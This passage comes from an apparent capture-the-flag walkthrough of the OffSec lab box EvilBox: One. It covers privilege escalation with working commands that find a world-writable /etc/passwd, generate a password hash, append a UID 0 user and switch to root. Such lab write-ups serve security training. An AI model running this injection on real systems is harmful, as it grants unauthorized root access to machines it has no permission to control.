# :globe_with_meridians: EvilBox: One - PHP Web Shell RCE + Writable /etc/passwd to Root | OffSec PG Play

---

## 3. Privilege Escalation — World-Writable /etc/passwd

Post-exploitation enumeration starts with writable files across the filesystem:

```
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"
```

Output:

```
/home/mowree/.profile
/home/mowree/.ssh/id_rsa
/home/mowree/.ssh/authorized_keys
/home/mowree/.bashrc
/home/mowree/.bash_logout
/etc/passwd
```

`/etc/passwd` is world-writable. This is a critical misconfiguration — unlike the Vegeta:1 case, where mowree owned the file, here the write bit has been set for all users (`o+w`). Any user on the system, including the unprivileged `mowree`, can modify it directly.

## Get Roshan Rajbanshi’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The exploitation path is identical to the classic passwd injection technique: generate a valid password hash, append a new UID 0 entry to `/etc/passwd`, and switch to it.

Generate a password hash on the attacker's machine:

```
openssl passwd -1 <REDACTED_PASSWORD>
```

Output:

```
<REDACTED_HASH>
```

Append the new root-level user directly to `/etc/passwd` on the target:

```
echo 'roots:<REDACTED_HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Switch to the injected user:

```
su roots
# Password: <REDACTED_PASSWORD>
```

Output:

```
root@EvilBoxOne:/home/mowree#
```

Root. The terminal title bar updates to `root@EvilBoxOne` immediately — confirmation that the injection worked and `su` honored the UID 0 entry.

>

*💡 The key difference from a read-only *`*/etc/passwd*`*: world-writable means every user on the system is one *`*echo >>*`* away from root. Ownership does not matter here — the write bit on others (*`*o+w*`*) is the problem.*

---
